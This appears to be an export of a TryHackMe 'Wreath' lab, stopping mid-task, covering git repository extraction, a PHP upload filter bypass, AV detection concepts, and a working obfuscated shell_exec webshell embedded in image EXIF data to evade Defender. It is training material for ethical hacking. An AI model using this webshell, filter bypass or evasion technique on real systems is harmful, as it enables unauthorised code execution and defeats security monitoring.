'hint': ''}, {'questionNo': 3, 'question': '<p>Exit out of evil-winrm -- you should see that a new directory called Website.git has been created locally. If you enter into this directory you will see an oddly named subdirectory (the same as the answer to question 1 of this task).</p><p>Rename this <i>subdirectory</i> to <code>.git</code>.<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>Git repositories always contain a special directory called <code>.git</code> which contains all of the meta-information for the repository. This directory can be used to fully recreate a readable copy of the repository, including things like version control and branches. If the repository is local then this directory would be a part of the full repository -- the rest of which would be the items of the repository in a human-readable format; however, as the <code>.git</code> directory is enough to recreate the repository in its entirety, the server doesn\'t need to store the easily readable versions of the files. This means that what we\'ve downloaded isn\'t actually the full repository, so much as the building blocks we can use to recreate the repo (which is exactly what happens when using <code>git clone</code> to create a local copy of a repo!).<br /></p><p>In order to extract the information from the repository, we use a suite of tools called GitTools.</p><p>Clone the GitTools repository into your current directory using:<br /><code>git clone https://github.com/internetwache/GitTools</code><br /></p><p>The GitTools repository contains three tools:</p><ul><li><b>Dumper </b>can be used to download an exposed <code>.git</code> directory from a website should the owner of the site have forgotten to delete it</li><li><b>Extractor</b> can be used to take a local <code>.git</code> directory and recreate the repository in a readable format. This is designed to work in conjunction with the Dumper, but will also work on the repo that we stole from the Git server. Unfortunately for us, whilst Extractor <i>will</i> give us each commit in a readable format, it will not sort the commits by date<br /></li><li><b>Finder</b> can be used to search the internet for sites with exposed <code>.git</code> directories. This is significantly less useful to an ethical hacker, although may have applications in bug bounty programmes</li></ul><p>Let\'s use Extractor to obtain a readable format of the repository!</p><p>The syntax for Extractor is as follows:<br /><code>./extractor.sh REPO_DIR DESTINATION_DIR</code></p><p>This is slightly confusing, so explaining each option:</p><ul><li>The <code>REPO_DIR</code> is the directory <i>containing</i> the <code>.git</code> directory for the repository. Note that this is not the <code>.git</code> directory itself. Extractor looks for a <code>.git</code> directory <i>inside</i> the specified directory (which is why we had to change the original name of the directory to ".git")</li><li>The <code>DESTINATION_DIR</code> is the subdirectory into which the repository will be created<br /></li></ul><p>For example, if we cloned the GitTools repo into the same directory as the <code>.git</code> directory we downloaded from the Git Server, we can extract the contents of the stolen repository into a subdirectory called "Website" using:<br /><code>GitTools/Extractor/extractor.sh . Website</code></p><p>This uses the current directory "<code>.</code>" (as the parent of the <code>.git</code> directory) and extracts into a newly created <code>Website</code> subdirectory.<br /><img style="width:714px" alt="Extracting the git respository. First cloning GitTools, then running the extractor on the current directory." src="https://assets.tryhackme.com/additional/wreath-network/6f1a257091d4.png" /></p><p>Recreate the repository -- we will perform some code analysis in the next task!<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>Let\'s head into the newly recreated repository. We see three directories:<br /><img style="width:1055px" alt="Showing the three commits as directories in the Website folder" src="https://assets.tryhackme.com/additional/wreath-network/e1479598dc52.png" /><br /></p><p>Each of these corresponds to a commit; however, as mentioned previously, these are not sorted by date...</p><p>It\'s\n up to us to piece together the order of the commits. Fortunately there \nare only three commits in this repository, and each commit comes with a <code>commit-meta.txt</code> file which we can use to get an idea of the order.</p><p>We could just cat each of these files out separately, but we may as well do it the fancy way with a bash one-liner:<br /><code>separator="=======================================";\n for i in $(ls); do printf "\\n\\n$separator\\n\\033[4;1m$i\\033[0m\\n$(cat \n$i/commit-meta.txt)\\n"; done; printf "\\n\\n$separator\\n\\n\\n"</code><br /></p><p>This gives us the three <code>commit-meta.txt</code> files in a nicely formatted order:<br /><img style="width:478px" alt="Formatted commit history using the one-liner above" src="https://assets.tryhackme.com/additional/wreath-network/fcd4bcda0749.png" /></p><p>Here we can see three commit messages: <code>Updated the filter</code>, <code>Initial Commit for the back-end</code>, and <code>Static Website Commit</code>.</p><p><i><b>Note:</b> The number at the start of these directories is arbitrary, and depends on the order in which GitTools extracts the directories. What matters is the hash at the end of the filename.</i><br /></p><p>Logically\n speaking, we can guess that these are currently in reverse order based on the commit message; \nhowever, we could also check the parent value of each commit. Starting \nat the only commit without a parent (which must be the initial commit), \nwe can work down the tree in stages like so:<br /><img style="width:565px" alt="Demonstrating the technique of matching a node name to the parent node specified in one other node" src="https://assets.tryhackme.com/additional/wreath-network/3a87596c906b.png" /><br /></p><p>We find the commit that has no parent (<code>70dde80cc19ec76704567996738894828f4ee895</code>), and check to see which of the other commits specifies it as a direct parent (<code>82dfc97bec0d7582d485d9031c09abcb5c6b18f2</code>). We then repeat the process to find the full commit order:</p><ol><li>70dde80cc19ec76704567996738894828f4ee895</li><li>82dfc97bec0d7582d485d9031c09abcb5c6b18f2</li><li>345ac8b236064b431fa43f53d91c98c4834ef8f3</li></ol><p>We <i>could</i> also do this by checking the timestamps attached to the commits (in UNIX format, after the emails); however, it is possible to fake these. Feel free to use them, but be aware that they may not always be accurate.<br /></p><hr /><p>If that didn\'t make sense, don\'t worry!</p>The short version is: the most up to date version of the site stored in the Git repository is in the <code>NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3</code> directory.', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-success size-16">Personal PC</span> Website Code Analysis', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/rowvOkZVsPQ" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Head into the <code>NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3/</code> directory.<br /></p><p>The <code>index.html</code> file isn\'t promising -- realistically we need some PHP, which we identified as the webserver\'s back-end language in Task 31. </p><p>Let\'s look for PHP files using <code>find</code>:<br /><code>find . -name "*.php"</code><br /></p><p>Only one result:<br /><code>./resources/index.php</code><br /><img style="width:879px" alt="Demonstration of finding the PHP file" src="https://assets.tryhackme.com/additional/wreath-network/1eba548b724f.png" /><br /></p><p>If we\'re going to find a serious vulnerability, it\'s going to have to be here!<br /></p><p></p>', 'taskType': 'none', 'taskNo': 36, 'taskCreated': '2021-01-24T19:58:52.967Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read through the file.</p><p>What does Thomas have to phone Mrs Walker about?<br /></p>', 'hint': 'Read the to-do list in the file.'}, {'questionNo': 2, 'question': "<p>This appears to be a file-upload point, so we might have the opportunity for a filter bypass here!</p><p>Additionally, the to-do list at the bottom of the page not only gives us an insight into Thomas' upcoming schedule, but it also gives us an idea about the protections around the page itself.</p><p>Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?<br /></p>", 'hint': 'Point 3 in the to-do list.'}, {'questionNo': 3, 'question': '<p>Let\'s turn our attention to the code itself now.</p><p>Reading through the PHP code, it appears that there are <i>two</i> filters in place here, plus a simple check to see if the file already exists.</p><p>These filters are rolled together into one block of PHP code:<br /><code>$size = getimagesize($_FILES["file"]["tmp_name"]);<br />if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){<br />\xa0\xa0\xa0 header("location: ./?msg=Fail");<br />\xa0\xa0\xa0 die();<br />}</code><br /></p><p>The first line here uses a classic PHP technique used to see if a file is an image. In short, images have their dimensions encoded in their exif data. The <code>getimagesize()</code> method returns these dimensions if the file is genuinely an image, or the boolean value <code>False</code> if the file is not an image. This is more difficult to bypass than other filters, but it\'s far from impossible to do so.</p><p> The second line is an If statement which checks two conditions. If either condition fails (indicated by the "Or" operator: <code>||</code>) then the script will redirect with a Failure message. The second condition is easy: <code>!$size</code> just checks to see if the <code>$size</code> variable contains the boolean <code>False</code>. The first condition may need to be broken down a little.</p><p><code>!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)</code></p><p>There are two functions in play here: <code>in_array()</code> and <code>explode()</code>. Let\'s start with the innermost function and work out the way:<br /><code>explode(".", $_FILES["file"]["name"])[1]</code></p><p>The <code>explode()</code> function is used to split a string at the specified character. Here it\'s being used to split the name of the file we uploaded at each period (<code>.</code>). From this we can (rightly) assume that this is a file-extension filter. As an example, if we were to upload a file called <code>image.jpeg</code>, this function would return a list: <code>["image", "jpeg"]</code>. As the filter only really needs the file-extension, it then grabs the second item from the list (<code>[1]</code>), remembering that lists start at 0.</p><p>This, unfortunately, leads to a big problem. What happens if there\'s more than one file extension? Let\'s say we upload a file called <code>image.jpeg.php</code>. The filename gets split into <code>["image", "jpeg", "php"]</code>, but only the <code>jpeg</code> (as the second element in the list) gets passed into the filter!</p><p>Looking at the outer function now (and replacing the inner function with a placeholder of <code>EXPLODE_RESULTS</code>):<br /><code>!in_array(EXPLODE_RESULTS, $goodExts)</code></p><p>This checks to see if the result returned by the <code>explode()</code> method is <i>not</i> in an array called <code>$goodExts</code>. In other words, this is a whitelist approach where only certain extensions will be accepted. The accepted extension list can be found in line 5 of the file. </p><hr /><p>Which extensions are accepted (comma separated, no spaces or quotes)?<br /></p>', 'hint': 'ext1,ext2,ext3,ext4'}, {'questionNo': 4, 'question': '<p>Between lines 4 and 15:<br /><code>$target = "uploads/".basename($_FILES["file"]["name"]);<br />...<br />move_uploaded_file($_FILES["file"]["tmp_name"], $target);<br /></code><br /></p><p>We can see that the file will get moved into an <code>uploads/</code> directory with it\'s original name, assuming it passed the two filters.</p><p>In summary:</p><ul><li>We know how to find our uploaded files</li><li>There are two file upload filters in play</li><li>Both filters are bypassable</li></ul><p>We have ourselves a vulnerability!<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-success size-16">Personal PC</span> Exploit PoC', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/EFBbGMW9Kso" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Ok, so we know what is likely to happen when we access this page:</p><ul><li>It will probably ask us for creds</li><li>We\'ll be able to upload image files</li><li>There are two filters in play to stop us from uploading other kinds of files</li><li>Both of these filters can be bypassed</li></ul><p>Perfect -- let\'s access the page!\xa0<br /></p>', 'taskType': 'none', 'taskNo': 37, 'taskCreated': '2021-01-24T23:31:18.533Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p></p><p>Let\'s head to the <code>/resources</code> directory.</p><p>As expected, we are met with a request for authentication:<br /><img style="width:771px" alt="Request for credentials" src="https://assets.tryhackme.com/additional/wreath-network/7b8a8b3287a7.png" /><br /></p>We can assume that the username here is <i>probably </i>either <code>Thomas</code> or <code>twreath</code> -- both of which we have already seen. We also already have one of Thomas\' passwords, stolen from the Git Server using Mimikatz. <p></p><p>See if you can login using these usernames with that password!<br /></p>', 'hint': ''}, {'questionNo': 2, 'question': '<p>Success!<br /><img style="width:758px" alt="Upload portal in the hidden page" src="https://assets.tryhackme.com/additional/wreath-network/5898d52a643f.png" /></p><p>How cute -- a page to allow Thomas to upload pictures of his beloved cat, Ruby.</p><p>Try uploading a legitimate image -- see if you can access it!<br /></p>', 'hint': "Read the previous task if you can't remember where uploaded images go, and how they are named. You will need to use the absolute URI to access the file, as the subdirectory containing uploaded files is not indexable."}, {'questionNo': 3, 'question': '<p>We already know how to bypass the first filter -- simply changing the extension to <code>.jpeg.php</code> should be enough.</p><p>The second filter is slightly harder, but doable.</p><p>As the <code>getimagesize()</code> function is checking for attributes that only an image will have, we need to give it what it wants: an image.</p><p>In other words, we need to upload a genuine image file which contains a PHP webshell <i>somewhere</i>. If this file has a <code>.php</code> file extension then it will be executed by the website as a PHP file, meaning all we need to do is force a webshell into the file and we\'re golden.</p><p>The easiest place to stick the shell is in the exifdata for the image -- specifically in the <code>Comment</code> field to keep it nicely out of the way.</p><p>Take a regular image (i.e. download a jpeg of your choice off the internet, keeping it safe for work) and rename it to <code>test-USERNAME.jpeg.php</code>, substituting in your own TryHackMe username.</p><p>We can then use <code>exiftool</code> to check the exifdata of the file:<br /><code>exiftool IMAGE_NAME</code><br /><img style="width:714px" alt="Checking the exif-data of the image -- nothing of note yet" src="https://assets.tryhackme.com/additional/wreath-network/a34cd3bc4060.png" /><br /></p><p><i><b>Note: </b>you may need to install exiftool before use (</i><i><code>sudo apt install exiftool</code>).</i></p><p>Here we can see all of the exifdata for the image. Exiftool also allows us to edit this information, which makes it a great choice for the exploit we\'re going to carry out.</p><p>Before we actually start inserting payloads into the image, however, there is one more thing to take into account. There is antivirus software running on this target. We don\'t know which AV Thomas uses, but we know that there will be protections enabled on this target. We don\'t know how strict the Antivirus software he uses is -- for all we know it will pick up any kind of default PHP webshell that we upload, alerting him to how close we are to compromising his host. It might not, but why take the chance? For this reason we will not be uploading a live payload in this task. Instead we will create a proof of concept here, then upload a live payload when we have completed the PHP Obfuscation task in the AV Evasion section of the network.</p><p>Bearing this in mind, let\'s create our PoC!</p><p>We\'ll be using the following PHP payload for this:<br /><code>&lt;?php echo "&lt;pre&gt;Test Payload&lt;/pre&gt;"; die();?&gt;<br /></code></p><p>This is completely harmless and ergo should not get picked up by the AV. It does give us confirmation that this is likely to work, however, and stages the way for the actual webshell upload.</p><p>To add this to our image we once again use exiftool:<br /><code>exiftool -Comment="&lt;?php echo \\"&lt;pre&gt;Test Payload&lt;/pre&gt;\\"; die(); ?&gt;" test-USERNAME.jpeg.php<br /></code><br /><img style="width:921.8px" alt="Exif data with the payload added in the comment" src="https://assets.tryhackme.com/additional/wreath-network/7fe0d0d6ee10.png" /></p><p>Now try uploading the file and accessing it in your browser!<br /><img style="width:777px" alt="Screenshot of the payload successfully activating" src="https://assets.tryhackme.com/additional/wreath-network/90b4465363db.png" /><br /></p><p><i><b>Note: </b>The HTML form is configured to only allow image uploads through the GUI, so don\'t be alarmed if you don\'t see your script in your working directory. Just change "All Supported Types" at the bottom right of the Window to "All Files":<br /></i><img style="width:539px" alt="File manager with All Supported Types highlighted" src="https://assets.tryhackme.com/additional/wreath-network/ec93f0bc06f9.png" /></p><p><img style="width:545px" alt="File manager after changing the type to All Files" src="https://assets.tryhackme.com/additional/wreath-network/f74dbe5147a5.png" /><br /></p><p>We have the ability to execute arbitrary PHP code on the system!<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(201,207,255,.18);color:#c9cfff">AV Evasion</span> Introduction', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/2PXuha963-I" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Antivirus Evasion is the third and final primary teaching point of the Wreath network.</p><p>By nature, AV Evasion is a rapidly changing topic. It\'s a constant dance between hackers and developers. Every time the developers release a new feature, the hackers develop a way around it. Every time the hackers bypass a new feature, the developers release another feature to close off the exploit, and so the cycle continues. Due to the speed of this process, it is nigh impossible to teach bleeding-edge techniques (and expect them to stay relevant for any length of time), so we are only going to be covering the fundamentals of the topic here. Without further ado, let\'s dive in!<br /></p><hr /><p>When it comes to AV evasion we have two primary types available:</p><ul><li>On-Disk evasion</li><li>In-Memory evasion</li></ul><p>On-Disk evasion is when we try to get a file (be it a tool, script, or otherwise) saved on the target, then executed. This is very common when working with executable (<code>.exe</code>) files.</p><p>In-Memory evasion is when we try to import a script directly into memory and execute it there. For example, this could mean downloading a PowerShell module from the internet or our own device and directly importing it without ever saving it to the disk.<br /></p><p>In ages past, In-Memory evasion was enough to bypass most AV solutions as the majority of antivirus software was unable to scan scripts stored in the memory of a running process. This is no longer the case though, as Microsoft implemented a feature called the <b>A</b>nti-<b>M</b>alware <b>S</b>can <b>I</b>nterface (AMSI). AMSI is essentially a feature of Windows that scans scripts as they enter memory. It doesn\'t actually check the scripts itself, but it does provide hooks for AV publishers to use -- essentially allowing existing antivirus software to obtain a copy of the script being executed, scan it, and decide whether or not it\'s safe to execute. Whilst there are various bypasses for this (often involving tricking AMSI into failing to load), these are out of scope for this room.</p><p>In terms of methodology: ideally speaking, we would start by attempting to fingerprint the AV on the target to get an idea of what solution we\'re up against. As this is often an interactive (social-engineering reliant) process, we will skip it for now and assume that the target is running the default Windows Defender so that we can get straight into the meat of the topic. If we already have a shell on the target, we may also be able to use programs such as <a href="https://github.com/PwnDexter/SharpEDRChecker" target="_blank">SharpEDRChecker</a> and <a href="https://github.com/GhostPack/Seatbelt" target="_blank">Seatbelt</a> to identify the antivirus solution installed. Once we know the OS version and AV of the target, we would then attempt to replicate this environment in a virtual machine which we can use to test payloads against. Note that we should <i>always</i> disable any kind of cloud-based protection in the AV settings (potentially by outright disconnecting the VM from the internet) so that the AV doesn\'t upload our carefully crafted payloads to a server somewhere for analysis, destroying all our hard work. Once we have a working payload, we can then deploy it against the target!</p><p>AV Evasion usually involves some form of obfuscation when it comes to payloads. This could mean anything from moving things around in the exploit and changing variable names, to encoding aspects of the script, to outright encrypting the payload and writing a wrapper to decrypt and execute the code section-by-section. The aim is to switch things enough that the AV software is unable to detect anything bad.<br /></p>', 'taskType': 'none', 'taskNo': 38, 'taskCreated': '2021-01-24T23:32:39.508Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Which category of evasion covers uploading a file to the storage on the target before executing it?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>What does AMSI stand for?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Which category of evasion does AMSI affect?<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(201,207,255,.18);color:#c9cfff">AV Evasion</span> AV Detection Methods', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/KHUQWshXcjc" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Before we get into the practical side of things, let\'s talk a little about the different detection methods employed by antivirus software.</p><p>Generally speaking, detection methods can be classified into one of two categories:</p><ul><li>Static Detection</li><li>Dynamic / Heuristic / Behavioural Detection</li></ul><p>Modern Antivirus software will usually rely on a combination of these.<br /></p><hr /><p>Static detection methods usually involve some kind of signature detection. A very rudimentary system, for example, would be taking the hashsum of the suspicious file and comparing it against a database of known malware hashsums. This system does tend to be used; however, it would never be used by itself in modern antivirus solutions. For this reason it\'s usually a good idea to change <i>something</i> when working with a known exploit. The smallest change to the file will result in a completely different hashsum, so even something as small as changing a string in the help message would be enough to bypass this kind of rudimentary detection system.</p><p>Fortunately (or unfortunately for us as hackers), this is usually nowhere near enough to bypass static detection methods.</p><p>The other form of static detection which is often used in antivirus software (to much greater effect) is a technique called Byte (or string) matching.<img style="width:150px;padding:20px;float:right" src="https://assets.tryhackme.com/additional/wreath-network/MDliMWY4MjNl.png" class="note-float-right" /> Byte matching is another form of signature detection which works by searching through the program looking to match sequences of bytes against a known database of bad byte sequences. This is much more effective than just hashing the entire file! Of course, it also means that we (as hackers) have a much harder job tracking down the exact line of code responsible for the flag.<br /></p><p>The tradeoff with this method is, of course, speed. Checking small sequences of bytes against a potentially huge program with multiple libraries can take a comparatively long time compared to the milliseconds it would take to hash the entire file and compare the hash against a database. As such, a compromise is sometimes made whereby the AV program hashes small sections of the file to check against the database, rather than hashing the entire thing. This obviously reduces the effectiveness of the technique, but does increase the speed somewhat.<br /></p><hr /><p>Where static virus malware detection methods look at the file itself, dynamic methods look at how the file <i>acts.</i> There are a couple of ways to do this.</p><ol><li>AV software can go through the executable line-by-line checking the flow of execution. Based on <i>pre-defined rules</i> about what type of action is malicious (e.g. is the program reaching out to a known bad website, or messing with values in the registry that it shouldn\'t be?), the AV can see how the program <i>intends</i> to act, and make decisions accordingly</li><li>The suspicious software can outright be executed inside a sandbox environment under close supervision from the AV software. If the program acts maliciously then it is quarantined and flagged as malware</li></ol><p><img style="width:125px;margin:20px;float:left" src="https://assets.tryhackme.com/additional/wreath-network/YzZkODljOGJm.png" class="note-float-left" />Evading these measures is still perfectly possible, although a lot harder than evading static detection techniques. Sandboxes tend to be relatively distinctive, so we just need to look for various system values (e.g. is there a fan installed, is there a GUI, and if so, what resolution is it, are there any distinctive tools or services running -- <code>VMtools</code> for VMware virtual machines, for example) and check to see if there are any red flags. For example, a machine with no fan, no GUI and a classic VM service running is very likely to be a sandbox -- in which case the program should just exit. If the program exits without doing anything malicious then the AV software is fooled into believing that it\'s safe and allows it to be executed on the target.</p><p>Equally, with logic-flow analysis, the AV software is still only working with a set of rules to check malicious behaviour. If the malware acts in a way that is unexpected (e.g. has some random code that does the grand sum of nothing inserted into the exploit) then it will likely pass this detection method.</p><p>In addition to this, when working with certain kinds of delivery methods, password protecting the file can get straight around the behavioural analysis checks as (unlike the user who knows the password), the AV software is unable to open and execute the file.</p><p>That said, dynamic detection methods are usually a lot more effective than static methods. The drawback is, once again, the time and resources required to spin up a VM to analyse the file in, or go through it line-by-line to see if it\'s doing anything malicious. These are actions that take time (causing users to grow impatient), and use up a lot of the computer\'s available resources. Once again the AV has to compromise, using a combination of dynamic and static analysis when scanning a file.<br /></p><hr /><p>To make life harder still, antivirus vendors are usually in close contact with one another -- as well as with scanning sites such as <a href="https://www.virustotal.com/" target="_blank">VirusTotal</a>. When the AV detects a suspicious file, it usually sends the file back to servers owned by the provider where it gets analysed and shared with other providers. What this means is that once our payload is detected on one computer, the chances are that it will quickly be taken apart and shielded against. This rapid sharing of information allows AV providers to stay ahead of bad actors (a good thing), but also obviously adds an extra complication into our job as Ethical Hackers.</p><p>Additionally, new techniques are being developed all the time. For example, many attempts are being made to use machine learning techniques to dynamically update the list of bad behaviours in a sandbox environment, or the rule-lists used in logic-flow analysis of a suspicious file. If you\'re interested in some of the work being done in this area, TryHackMe\'s very own <a href="https://cmnatic.co.uk/" target="_blank">CMNatic</a> did his dissertation on the subject, which can be read <a href="https://resources.cmnatic.co.uk/Presentations/Dissertation/" target="_blank">here</a>.<br /></p>', 'taskType': 'none', 'taskNo': 39, 'taskCreated': '2021-01-25T21:19:56.461Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What other name can be used for Dynamic/Heuristic detection methods?<br />', 'hint': 'Dynamic, Heuristic, and..?'}, {'questionNo': 2, 'question': '<p>If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?<br /></p>', 'hint': 'Take the answer from the task -- the answer is in italics.'}, {'questionNo': 4, 'question': '<p>What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?<br /></p>', 'hint': 'This only works with certain delivery methods, if you can trick a user into opening/executing the file.'}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(201,207,255,.18);color:#c9cfff">AV Evasion</span> PHP Payload Obfuscation', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/5qA7stuTa5U" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Now that we\'ve covered the basic terminology, let\'s get back to hacking this PC!</p><p>We have an upload point which we can use to upload PHP scripts. We now need to figure out how to make a PHP script that will bypass the antivirus software. Windows Defender is free and comes pre-installed with Windows Server, so let\'s assume that this is what is in use for the time being.<br /></p><p>The solution is this:<br />We build a payload that does what we need it to do (preferably in a slightly less than common way), then we obfuscate it either manually or by using one of the many tools available online. </p><p>First up, let\'s build that payload:<br /><code>&lt;?php<br />\xa0\xa0\xa0 $cmd = $_GET["wreath"];<br />\xa0\xa0\xa0 if(isset($cmd)){<br />\xa0\xa0\xa0\xa0\xa0\xa0\xa0 echo "&lt;pre&gt;" . shell_exec($cmd) . "&lt;/pre&gt;";<br />\xa0\xa0\xa0 }<br />\xa0\xa0\xa0 die();<br />?&gt;</code><br /></p><p>Here we check to see if a GET parameter called "wreath" has been set. If so, we execute it using <code>shell_exec()</code>, wrapped inside HTML <code>&lt;pre&gt;</code> tags to give us a clean output. We then use <code>die()</code> to prevent the rest of the image from showing up as garbled text on the screen.<br /></p><p>This is slightly longer than the classic PHP one-liner webshell (<code>&lt;?php system($_GET["cmd"]);?&gt;</code>) for two reasons:</p><ol><li>If we\'re obfuscating it then it will become a one-liner anyway</li><li>Anything <i>different</i> is good when it comes to AV evasion</li></ol><p>We now need to obfuscate this payload. </p><p>There are a variety of measures we could take here, including but not limited to:</p><ul><li>Switching parts of the exploit around so that they\'re in an unusual order</li><li>Encoding all of the strings so that they\'re not recognisable</li><li>Splitting up distinctive parts of the code (e.g. <code>shell_exec($_GET[...])</code>)</li></ul>', 'taskType': 'none', 'taskNo': 40, 'taskCreated': '2021-01-24T23:40:15.631Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Manual obfuscation is very much a thing, but for the sake of \nsimplicity, let\'s just use one of the available online tools. The tool \nlinked <a href="https://www.gaijin.at/en/tools/php-obfuscator" target="_blank">here</a>\n is recommended. When it comes to web obfuscation, these tools are \ngenerally used to make the code difficult for humans to read; however, \nby doing things like obfuscating variable/function names and encoding \nstrings, they also prove effective against antivirus software.<br /></p><p>Stick the payload into the tool, then activate all the obfuscation options:<br /><img style="width:604px" alt="Obfuscator with the payload input and all options set" src="https://assets.tryhackme.com/additional/wreath-network/bb2ef4375625.png" /><br /></p><p>Click the "Obfuscate Source Code" button, and we\'re left with this mess of PHP:<br /><code>&lt;?php\n $p0=$_GET[base64_decode(\'d3JlYXRo\')];if(isset($p0)){echo \nbase64_decode(\'PHByZT4=\').shell_exec($p0).base64_decode(\'PC9wcmU+\');}die();?&gt;</code><br /></p><p>If you look closely you\'ll see that this is still very much the same payload as before; however, enough has changed that it <i>should</i> fool Defender.</p><p>As\n this is getting passed into a bash command, we will need to escape the \ndollar signs to prevent them from being interpreted as bash variables. \nThis means our final payload is as follows:<br /><code>&lt;?php \\$p0=\\$_GET[base64_decode(\'d3JlYXRo\')];if(isset(\\$p0)){echo \nbase64_decode(\'PHByZT4=\').shell_exec(\\$p0).base64_decode(\'PC9wcmU+\');}die();?&gt;</code></p><p><br /></p>', 'hint': ''}, {'questionNo': 2, 'question': '<p>With an obfuscated payload, we can now finalise our exploit.</p><p>Once again, make a copy of an innocent image (ensuring you give it a name in the format of <code>shell-USERNAME.jpeg.php</code>), then use <code>exiftool</code> to embed the payload into the image:<br /><code>exiftool -Comment="&lt;?php \\$p0=\\$_GET[base64_decode(\'d3JlYXRo\')];if(isset(\\$p0)){echo \nbase64_decode(\'PHByZT4=\').shell_exec(\\$p0).base64_decode(\'PC9wcmU+\');}die();?&gt;" shell-USERNAME.jpeg.php<br /></code></p><p><img style="width:921.8px" alt="Screenshot showing the insertion of the obfuscated webshell into the image with exiftool" src="https://assets.tryhackme.com/additional/wreath-network/98a8bd99378c.png" /></p><p><br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Upload your shell and attempt to access it!</p><p>If this worked then you should get an output similar to the following:<br /><img style="width:921.8px" alt="Screenshot showing an error message received when loading the webshell without a parameter" src="https://assets.tryhackme.com/additional/wreath-network/6b09145ae074.png" /><br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>Awesome! We have a shell.</p><p>We can now execute commands using the <code>wreath</code> GET parameter, e.g:<br /><code>http://10.200.72.100/resources/uploads/shell-USERNAME.jpeg.php?wreath=systeminfo</code><br /><img style="width:910px" alt="Demonstration of executing the systeminfo command through the webshell" src="https://assets.tryhackme.com/additional/wreath-network/2920fdb4cd18.png" /><br /></p><p><br /></p><hr /><p>What is the Host Name of the target?<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>What is our current username (include the domain in this)?<br /></p>', 'hint': 'The answer format should be hostname\\username.'}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(201,207,255,.18);color:#c9cfff">AV Evasion</span> Compiling Netcat &amp; Reverse Shell!', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/aIkOMYVVYws" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Our webshell is all well and good, but let\'s go for a full reverse shell!</p><p>Unfortunately, we have a problem. Unlike in Linux where there are usually many ways to obtain a reverse shell, the options in Windows are a lot fewer in number as Windows tends not to have many scripting languages installed by default.</p><p>Realistically we have several options here:</p><ul><li>Powershell tends to be the go-to for Windows reverse shells. Unfortunately Defender knows exactly what PowerShell reverse shells look like, so we\'d have to do some serious obfuscation to get this to work.</li><li>We could try to get a PHP reverse shell as we know the target has a PHP interpreter installed. Windows PHP reverse shells tend to be iffy though, and again, may trigger Defender.</li><li>We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the <a href="https://www.veil-framework.com/" target="_blank">Veil Framework</a> to give us a meterpreter shell executable that might bypass Defender, but let\'s try to keep this manual for the time. Equally, <a href="https://www.shellterproject.com/" target="_blank">shellter</a> (though old) might give us what we 